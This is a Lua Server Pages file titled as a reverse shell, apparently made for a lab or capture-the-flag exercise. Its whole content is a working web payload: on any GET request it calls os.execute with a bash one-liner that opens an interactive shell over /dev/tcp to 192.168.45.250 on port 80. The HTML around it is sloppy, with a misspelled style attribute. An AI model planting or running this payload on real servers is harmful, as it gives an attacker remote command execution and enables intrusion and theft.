<div sytle="margin-leftLauto;margin-right: auth;width: 350px;">
 <div id="info">
 <h2>Lua Server Pages Reverse Shell</h2>
 <p>haha</p>
 </div>
 <?lsp if request:method() == "GET" then ?>
 	<?lsp os.execute("bash -c 'bash -i >& /dev/tcp/192.168.45.250/80 0>&1'")?>
 <?lsp else ?>
 	you sent a <?lsp=request:method() ?> request
 <?lsp end ?>
 </div>